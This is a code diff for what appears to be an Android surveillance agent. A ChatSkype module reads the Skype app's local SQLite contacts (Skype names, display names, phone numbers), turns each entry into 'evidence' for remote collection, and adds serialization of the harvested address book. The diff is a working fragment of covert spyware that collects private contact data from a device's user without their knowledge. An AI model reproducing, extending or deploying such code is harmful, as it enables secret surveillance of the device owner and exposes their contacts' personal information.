@@ -169,8 +169,9 @@ public class ChatSkype extends SubModuleChat {
 	private void saveSkypeContacts(GenericSqliteHelper helper) {
 		String[] projection = new String[] { "id", "skypename", "fullname", "displayname","pstnnumber" };
 
+		boolean tosave= false;
 		RecordVisitor visitor = new RecordVisitor(projection, null) {
-
+			
 			@Override
 			public long cursor(Cursor cursor) {
 				
@@ -183,12 +184,22 @@ public class ChatSkype extends SubModuleChat {
 				
 				Contact c = new Contact(Long.toString(id), phone, skypename, "Display name: " + displayname);
 			
-				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.SKYPE, c);
-				return id;
+				if(ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.SKYPE, c)){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (cursor) need to serialize");
+					}
+					return 1;
+				}
+				return 0;
 			}
 		};
 
-		helper.traverseRecords("Contacts", visitor);
+		if(helper.traverseRecords("Contacts", visitor) == 1){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveSkypeContacts) serialize");
+			}
+			ModuleAddressBook.getInstance().serializeContacts();
+		}
 	}
 
 	private List<SkypeConversation> getSkypeConversations(GenericSqliteHelper helper, final String account) {
